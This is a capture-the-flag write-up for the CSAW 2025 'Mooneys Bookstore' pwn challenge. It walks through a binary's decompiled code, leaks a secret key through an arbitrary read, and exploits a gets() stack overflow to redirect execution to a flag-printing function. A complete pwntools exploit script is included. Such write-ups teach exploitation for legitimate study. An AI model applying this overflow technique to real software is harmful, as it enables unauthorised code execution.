---
title: "CSAW CTF Quals' 2025 Writeup"
permalink: /csaw-ctf-quals-2025
---

# Writeup for "Mooneys Bookstore" Challenge
We are given a pwn challenge binary, `overflow_me`.

First, we look at the file's info with `file overflow_me` and see we are working with an x86-64 ELF file that hasn't been stripped:
```
overflow_me: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d6a8fb91df07f04d257b59b8230f6ddb1d8507e, for GNU/Linux 3.2.0, not stripped
```

Then, we check the security mechanisms in place with `checksec overflow_me` and see there is no canary and that the stack is not executable:
```
[*] '/Users/lomichael/ctf/csaw2025/mooneys-bookstore/overflow_me'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Running the binary (`./overflow_me`), we see the printout below, prompting us for an address:
```
Mooney's. The bell above the door cries out, and suddenly... it's you. Of course it's you.
Every shelf bends toward you, every page waits to be touched by you.
You think you're just here to buy a book. But I know better.
You came here to be seen. By me.

Your favorite book waits for you. Tell me its address

```

Since we do not know what address to provide, we analyze the binary in Ghidra to see what is going on.

The `main()` function decompiled by Ghidra looks like:
```C
undefined8 main(void)

{
  FILE *ctx;
  long local_18;
  undefined8 *local_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  ctx = stdin;
  setvbuf(stdin,(char *)0x0,2,0);
  init((EVP_PKEY_CTX *)ctx);
  puts(&DAT_00402018);
  puts("\nYour favorite book waits for you. Tell me its address");
  read(0,&local_10,8);
  printf("%lx\n",*local_10);
  puts("\nOf course there\'s a key. There always is. If you speak it, the story unlocks");
  read(0,&local_18,8);
  if (local_18 == secret_key) {
    get_input();
  }
  else {
    puts(&DAT_004021b0);
  }
  return 0;
}
```

In the decompiled code above, we can see that if we successfully provide the `secret_key`, the `get_input()` function will be called. Conveniently, the code dumps the value at an address for us, in the lines:
```C
puts("\nYour favorite book waits for you. Tell me its address");
read(0,&local_10,8);
printf("%lx\n",*local_10);
```
We can use this to get the value of the address labeled `secret_key` (i.e. 0x004040b8) and thus pass the check to call `get_input()`.

Inspecting the `get_input()` function in Ghidra, we see:
```C
void get_input(void)

{
  char local_58 [64];
  long local_18;
  FILE *local_10;
  
  local_10 = fopen("/dev/urandom","rb");
  if (local_10 == (FILE *)0x0) {
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  fread(&val,8,1,local_10);
  fclose(local_10);
  local_18 = val;
  printf("\n\tA post-it on the floor. You would have stepped over it. I didn\'t. It has something fo r you: 0x%lx\n"
         ,val);
  puts("\nYour turn now. Write yourself into this story.");
  fflush(stdout);
  gets(local_58);
  if (local_18 != val) {
    puts("\nDisappointing. But that\'s you, isn\'t it? Messy. Human. And I stay anyway.");
    fflush(stdout);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  return;
}
```

Immediately, notice the line `gets(local_58)`, which is a common vulnerability, allowing unbounded input. Abusing this, we can overflow the buffer `local_58`, writing into other parts of the stack. There is no obvious way to print the flag in the decompiled `get_input()` function, but we know that we can write into the return address using the stack buffer overflow vulnerability. We can look in the "Functions" section of the Symbol Tree in Ghidra and see a `get_flag()` function that `cat`s the flag for us:
```C

void get_flag(void)

{
  fflush(stdout);
  system("cat flag.txt");
  fflush(stdout);
                    /* WARNING: Subroutine does not return */
  _exit(0);
}
```
If we place the address of this `get_flag()` function (i.e. 0x00401425) as the return address for the current stack frame, we can hijack the control flow to end up in `get_flag()`.

Before we do this, however, we must be cautious, since `get_input()` does a comparison with the `val` variable. If this check fails, the function exits prematurely, not returning the control flow to the `get_flag()` function. So, we must ensure that the value on the "post-it" printed by the program is inserted in the proper local (`local_18`) on the stack, so the check can pass.

So, our plan of attack now looks like:
- Send the address labeled `secret_key` to get its value
- Send the `secret_key` value to call `get_input()`
- Place `val` in `local_18` to avoid a premature exit()
- Place address of `get_flag()` into the ret address and return

Putting it together in a pwntools script we then get:
```Python
from pwn import *

p = remote("chals.ctf.csaw.io", 21006)

p.recvuntil(b"Tell me its address")
p.send(p64(0x4040b8)) # send address of secret_key to get its value

throwaway = p.recvline().strip()
line = p.recvline().strip()
secret_key = int(line, 16)

p.send(p64(secret_key)) # send secret_key to pass check before call get_input()

while b'0x' not in line:
    line = p.recvline().strip()

val = int(line.split(b'0x')[1], 16) # parse the output to get val

payload = b'\x00' * 0x40 # pad the stack until local_18
payload += p64(val) # set local_18 to val
payload += b'\x00' * 0x10 # pad stack to ret address
payload += p64(0x401425) # set the ret address to get_flag

p.sendline(payload)

p.interactive()
```

Some explanations for the math behind the payload numbers:
- `gets(local_58)` writes into a 64-byte buffer at ebp-0x58
- writing 0x40 null bytes starting at ebp-0x58 lands us at ebp-0x18 which is the start of `local_18`
- after we write the 8-byte `val` into `local_18` at ebp-0x18 we are then writing at ebp-0x10
- writing 0x10 more null bytes lands us at the point where we can overwrite the return address 
